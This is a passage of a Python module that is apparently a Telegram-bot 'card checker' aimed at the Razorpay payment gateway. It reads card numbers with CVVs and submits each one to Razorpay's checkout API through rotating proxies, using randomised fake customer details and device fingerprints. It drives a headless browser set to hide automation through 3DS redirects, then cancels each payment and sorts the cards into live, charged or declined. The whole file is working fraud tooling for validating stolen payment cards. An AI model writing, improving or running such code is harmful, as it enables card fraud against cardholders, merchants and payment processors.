        "Referer": site_url,
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site"
    }
    data = {
        "notes[comment]": "",
        "payment_link_id": payment_link_id,
        "key_id": key_id,
        "contact": f"+91{user_info['phone']}",
        "email": user_info["email"],
        "currency": "INR",
        "_[library]": "checkoutjs",
        "_[platform]": "browser",
        "_[referer]": site_url,
        "amount": amount_paise,
        "order_id": order_id,
        "device_fingerprint[fingerprint_payload]": ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(128)),
        "method": "card",
        "card[number]": card_number,
        "card[cvv]": cvv,
        "card[name]": user_info["name"],
        "card[expiry_month]": exp_month,
        "card[expiry_year]": exp_year,
        "save": "0"
    }
    try:
        return session.post(url, headers=headers, params=params, data=urlencode(data), timeout=8)
    except requests.exceptions.RequestException:
        return None


def _check_payment_status(payment_id, key_id, session_token, keyless_header, proxy_reqs):
    headers = {
        'Accept': '*/*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-session-token': session_token,
        'Origin': 'https://razorpay.com'
    }
    params = {'key_id': key_id, 'session_token': session_token, 'keyless_header': keyless_header}
    try:
        r = requests.get(f'https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}', params=params, headers=headers, timeout=5, proxies=proxy_reqs)
        if r.status_code == 200:
            data = r.json()
            return data.get('status', 'unknown'), data
        return 'unknown', {}
    except:
        return 'unknown', {}


def _cancel_payment(payment_id, key_id, session_token, keyless_header, proxy_reqs):
    headers = {
        'Accept': '*/*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-session-token': session_token,
        'Origin': 'https://razorpay.com'
    }
    params = {'key_id': key_id, 'session_token': session_token, 'keyless_header': keyless_header}
    try:
        r = requests.get(f'https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}/cancel', params=params, headers=headers, timeout=5, proxies=proxy_reqs)
        try:
            return r.json()
        except json.JSONDecodeError:
            return {"error": {"description": f"Cancel HTTP {r.status_code}", "reason": "http_error"}}
    except Exception as e:
        return {"error": {"description": f"Cancel error: {e}", "reason": "network_error"}}


def _handle_3ds_redirect_with_cancel_sync(redirect_url, payment_id, key_id, session_token, keyless_header, proxy_config, proxy_reqs):
    page_text = ""
    page_closed_early = False
    
    try:
        with sync_playwright() as p:
            browser_args = ['--no-sandbox', '--disable-dev-shm-usage', '--disable-web-security', '--disable-blink-features=AutomationControlled']
            if platform.system() == 'Linux':
                browser_args.extend(['--disable-gpu', '--disable-software-rasterizer'])
            
            browser = p.chromium.launch(headless=True, proxy=proxy_config, args=browser_args, timeout=15000)
            context = browser.new_context(ignore_https_errors=True)
            page = context.new_page()
            
            try:
                page.goto(redirect_url, timeout=8000, wait_until='domcontentloaded')
            except Exception as nav_err:
                if "Target closed" not in str(nav_err) and "browser has been closed" not in str(nav_err):
                    try:
                        page.goto(redirect_url, timeout=12000, wait_until='commit')
                    except:
                        pass
            
            if not page_closed_early:
                try:
                    page.wait_for_timeout(TDS_WAIT_SECONDS * 1000)
                    page_text = page.locator("body").inner_text()
                except Exception as wait_err:
                    if "Target closed" in str(wait_err) or "browser has been closed" in str(wait_err):
                        page_closed_early = True
                    else:
                        try:
                            page_text = page.locator("body").inner_text()
                        except:
                            page_text = ""
                
                try:
                    browser.close()
                except:
                    pass
            
    except Exception as e:
        if "Target closed" in str(e) or "browser has been closed" in str(e):
            page_closed_early = True
    
    cancel_data = _cancel_payment(payment_id, key_id, session_token, keyless_header, proxy_reqs)
    
    return {
        "page_text": page_text.strip()[:300] if page_text.strip() else "",
        "page_closed_early": page_closed_early,
        "cancel_response": cancel_data
    }


# ==================== RESPONSE PARSING ====================

def _extract_clean_response(cancel_data, is_charged=False):
    if is_charged:
        return {"description": "Your order was successful", "reason": "card_charged"}
    
    if not isinstance(cancel_data, dict):
        return {}
    
    if _is_pg_router_response(cancel_data):
        return _auth_failed_response()
    
    err = cancel_data.get("error")
    if isinstance(err, dict):
        desc = _sanitize_telegram(err.get("description", ""))
        reason = err.get("reason", "")
        if desc or reason:
            return {"description": desc, "reason": reason}
    
    desc = _sanitize_telegram(cancel_data.get("description", ""))
    reason = cancel_data.get("reason", "")
    if desc or reason:
        return {"description": desc, "reason": reason}
    
    return {}


def _determine_tag_from_cancel(cancel_data):
    if not isinstance(cancel_data, dict):
        return "UNKNOWN", "unknown"
    
    if _is_pg_router_response(cancel_data):
        return "DECLINED", "authentication_failed"
    
    err = cancel_data.get("error")
    if not isinstance(err, dict):
        return "UNKNOWN", "unknown"
    
    reason_code = err.get("reason", "")
    desc = err.get("description", "")
    
    if reason_code == "payment_cancelled":
        return "LIVE", "payment_cancelled"
    
    decline_reasons = ["invalid_card", "card_declined", "expired_card", "incorrect_pin", "insufficient_funds", "processing_error", "invalid_cvv", "bank_technical_error", "gateway_error", "bad_request", "authentication_failed", "timeout", "do_not_honour", "card_not_enrolled"]
    
    if reason_code in decline_reasons:
        return "DECLINED", reason_code
    
    decline_keywords = ["declined", "invalid", "expired", "blocked", "restricted", "do not honour", "temporary issue", "didn't go through", "not enabled", "not enrolled"]
    desc_lower = desc.lower() if desc else ""
    if any(kw in desc_lower for kw in decline_keywords):
        return "DECLINED", reason_code if reason_code else "bank_declined"
    
    if "cancelled" in desc_lower:
        return "LIVE", "payment_cancelled"
    
    return "LIVE", "unknown_live"


# ==================== CARD PROCESSING ====================

def _process_card_with_proxy(cc_line, plid, ppiid, kid, kh, stoken, site_url, amount_paise, proxy_config, proxy_reqs):
    try:
        num, mm, yy, cvv = cc_line.strip().split('|')
    except ValueError:
        return "SKIP", cc_line.strip(), {"description": "Invalid format", "reason": "invalid_format"}

    session = requests.Session()
    if proxy_reqs:
        session.proxies.update(proxy_reqs)
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Connection": "keep-alive"
    })

    order_id = None
    for attempt in range(3):
        res = _create_order(session, plid, amount_paise, ppiid, session_token=stoken, keyless_header=kh)
        if res:
            order_id = res
            break
        if attempt < 2:
            time.sleep(1.5)

    if not order_id:
        return "FAIL", cc_line.strip(), {"description": "Order creation failed", "reason": "order_failed"}

    time.sleep(random.uniform(0.3, 0.8))

    try:
        user_info = _random_user_info()
        response = _submit_payment(session, order_id, (num, mm, yy, cvv), user_info, amount_paise, kid, kh, plid, stoken, site_url)
        if not response:
            return "ERROR", cc_line.strip(), {"description": "The card expiry is invalid.", "reason": "BAD_REQUEST_ERROR"}
        pdata = response.json()
    except Exception as e:
        return "ERROR", cc_line.strip(), {"description": "Payment parsing failed", "reason": "parse_error"}

    pid = pdata.get("payment_id") or pdata.get("razorpay_payment_id")
    if not pid and isinstance(pdata.get("payment"), dict):
        pid = pdata["payment"].get("id")

    if pdata.get("redirect") == True or pdata.get("type") == "redirect":
        rurl = pdata.get('request', {}).get('url') if isinstance(pdata.get('request'), dict) else None
        if rurl and pid:
            tds_result = _handle_3ds_redirect_with_cancel_sync(rurl, pid, kid, stoken, kh, proxy_config, proxy_reqs)
            page_text = tds_result["page_text"]
            cancel_data = tds_result["cancel_response"]
            clean = _extract_clean_response(cancel_data)
            
            if 'razorpay_signature' in page_text.lower() or 'payment successful' in page_text.lower():
                return "CHARGED", cc_line.strip(), _extract_clean_response(cancel_data, is_charged=True)
            
            time.sleep(1)
            stat, sdata = _check_payment_status(pid, kid, stoken, kh, proxy_reqs)
            
            if stat in ['captured', 'authorized']:
                return "CHARGED", cc_line.strip(), _extract_clean_response(cancel_data, is_charged=True)
            
            if stat == 'failed':
                if not clean:
                    err = sdata.get('error_description') or ''
                    err_obj = sdata.get('error', {})
                    if isinstance(err_obj, dict):
                        err = err_obj.get('description', err)
                    clean = {"description": _sanitize_telegram(err) if err else "Payment failed", "reason": "payment_failed"}
                return "DECLINED", cc_line.strip(), clean
            
            tag, reason_code = _determine_tag_from_cancel(cancel_data)
            
            if tag == "LIVE":
                return "LIVE", cc_line.strip(), {"description": "Your card needs 3ds verification.", "reason": "3ds_required"}
            if tag == "DECLINED":
                return "DECLINED", cc_line.strip(), clean
            
            return "LIVE", cc_line.strip(), {"description": "Your card needs 3ds verification.", "reason": "3ds_required"}

        return "FAIL", cc_line.strip(), {"description": "3DS redirect missing URL", "reason": "redirect_error"}

    if "razorpay_signature" in pdata or "signature" in pdata:
        return "CHARGED", cc_line.strip(), _extract_clean_response({}, is_charged=True)

    if _is_pg_router_response(pdata):
        return "DECLINED", cc_line.strip(), _auth_failed_response()

    if "error" in pdata:
        err = pdata.get('error', {})
        if isinstance(err, dict):
            desc = _sanitize_telegram(err.get('description', 'Unknown error').replace("%s", "Card"))
            reason = err.get('reason', '') or err.get('code', '')
            return "DECLINED", cc_line.strip(), {"description": desc, "reason": reason}
        return "DECLINED", cc_line.strip(), {"description": _sanitize_telegram(str(err)[:80]), "reason": "error"}

    return "UNKNOWN", cc_line.strip(), {"description": _sanitize_telegram(json.dumps(pdata)[:100]), "reason": "unknown"}


def _build_output(card, tag, clean_resp):
    out = {"card": card}
    if tag == "CHARGED":
        out["status"] = "charged"
        out["description"] = "Your order was successful"
        out["reason"] = "card_charged"
    elif clean_resp.get("reason") == "authentication_failed":
        out["status"] = "declined"
        out["description"] = "Your payment could not be completed due to incorrect OTP or verification details."
        out["reason"] = "authentication_failed"
    elif clean_resp.get("reason") == "insufficient_funds":
        out["status"] = "approved"
        out["description"] = clean_resp.get("description", "Insufficient funds")
        out["reason"] = "insufficient_funds"
    elif tag == "DECLINED":
        out["status"] = "declined"
        out["description"] = clean_resp.get("description", "Unknown error")
        out["reason"] = clean_resp.get("reason", "declined")
    else:
        out["status"] = "declined"
        out["description"] = clean_resp.get("description", "Unknown error")
        out["reason"] = clean_resp.get("reason", "unknown")
    return out


# ==================== PROCESS WORKER ====================

def _card_worker_process(card_line, proxy_string, result_queue, worker_id, merchant_data=None):
    try:
        proxy_data = _parse_proxy_string(proxy_string)
        if not proxy_data:
            result_queue.put({"worker_id": worker_id, "status": "error", "response": "Invalid proxy", "card": card_line})
            return
        
        proxy_config = proxy_data['proxy_playwright']
        proxy_reqs = proxy_data['proxy_reqs']
        
        if merchant_data:
            kh, kid, plid, ppiid = merchant_data['kh'], merchant_data['kid'], merchant_data['plid'], merchant_data['ppiid']
        else:
            kh, kid, plid, ppiid, err = _extract_merchant_data_with_proxy(proxy_data)
            if err:
                result_queue.put({"worker_id": worker_id, "status": "error", "response": _sanitize_telegram(f"Merchant: {err}")[:80], "card": card_line})
                return
        
        stoken, err = _get_session_token_robust(proxy_data, proxy_reqs)
        
        if err:
            result_queue.put({"worker_id": worker_id, "status": "error", "response": _sanitize_telegram(f"Token: {err}")[:80], "card": card_line})
            return
        
        tag, card_str, clean_resp = _process_card_with_proxy(card_line, plid, ppiid, kid, kh, stoken, HARDCODED_SITE, HARDCODED_AMOUNT_PAISE, proxy_config, proxy_reqs)
        
        out = _build_output(card_str, tag, clean_resp)
        status = out.get("status", "declined")
        desc = out.get("description", "Unknown error")
        reason = out.get("reason", "unknown")
        response_str = f"{desc} [{reason}]" if reason != "unknown" else desc
        
        result_queue.put({"worker_id": worker_id, "status": status, "response": _sanitize_telegram(response_str), "card": card_line})
        
    except Exception as e:
        result_queue.put({"worker_id": worker_id, "status": "error", "response": _sanitize_telegram(str(e)[:80]), "card": card_line})


def _run_card_process_blocking(card: str, proxy_string: str, worker_id: str, merchant_data: dict = None) -> dict:
    result_queue = Queue()
    
    process = Process(target=_card_worker_process, args=(card, proxy_string, result_queue, worker_id, merchant_data), daemon=True)
    process.start()
    process.join(timeout=PROCESS_TIMEOUT)
    
    if process.is_alive():
        process.terminate()
        try:
            process.join(timeout=3)
        except:
            pass
        if process.is_alive():
            process.kill()
            process.join(timeout=2)
        return {"status": "error", "response": "Process timeout"}
    
    try:
        result = result_queue.get_nowait()
        return {"status": result.get("status", "error"), "response": result.get("response", "Unknown error")}
    except:
        return {"status": "error", "response": "No result from worker"}


# ==================== ASYNC GATE FUNCTION ====================

async def check_gate(card: str) -> dict:
    try:
        if not PLAYWRIGHT_AVAILABLE:
            return {"status": "error", "response": "Playwright not installed"}
        
        try:
            merchant_data = await _ensure_merchant_data()
        except Exception as e:
            logging.error(f"[Razorpay] Cannot get merchant data: {e}")
            _invalidate_merchant_cache()
            return {"status": "error", "response": "Merchant data unavailable - retry in 30s"}
        
        proxy_string = await _get_next_proxy()
        worker_id = f"{int(time.time()*1000)}_{random.randint(1000,9999)}"
        
        loop = asyncio.get_running_loop()
        result = await loop.run_in_executor(_get_executor(), _run_card_process_blocking, card, proxy_string, worker_id, merchant_data)
        
        if result.get("status") == "error" and "API_ERROR" in result.get("response", ""):
            _invalidate_merchant_cache()
        
        return result
            
    except Exception as e:
        logging.error(f"Razorpay Gate Error: {e}")
        return {"status": "error", "response": _sanitize_telegram(str(e)[:80])}


# ==================== MODULE INIT ====================

def init_module():
    global _proxy_index
    _proxy_index = random.randint(0, len(PROXY_LIST) - 1)
    logging.info(f"[Razorpay] v5.5 initialized - {len(PROXY_LIST)} proxies")
    logging.info(f"[Razorpay] Merchant extraction: 5 methods (Intercept, JS eval, HTML parse, API, HTTP fetch)")
    logging.info(f"[Razorpay] Increased timeouts and wait times for reliability")

init_module()
